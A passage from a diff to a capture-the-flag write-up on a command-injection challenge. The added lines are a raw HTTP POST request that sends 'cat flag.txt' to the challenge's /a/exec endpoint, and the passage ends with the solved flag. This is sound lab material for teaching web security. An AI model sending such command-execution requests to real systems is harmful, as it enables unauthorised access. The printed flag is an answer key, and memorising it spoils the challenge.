@@ -140,6 +140,22 @@ It shows `Command not allowed`. The server has some other implementation. Either
 The output we get is `{"output":"__pycache__\napp.py\nflag.txt\nindex.html\nstatic\ntemplates\n"}`
 
 Next just send `cat flag.txt` as the command and viola, you get the flag.
+```
+POST /a/exec HTTP/1.1
+Host: challenge.ctf.cybermaterial.com
+Content-Length: 17
+Accept-Language: en-US
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://challenge.ctf.cybermaterial.com
+Referer: http://challenge.ctf.cybermaterial.com/a/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+{"command":"cat flag.txt"}
+```
+
 
 Flag:- `CM{c0mMAnd_INjEc7iON_f7w}`
 
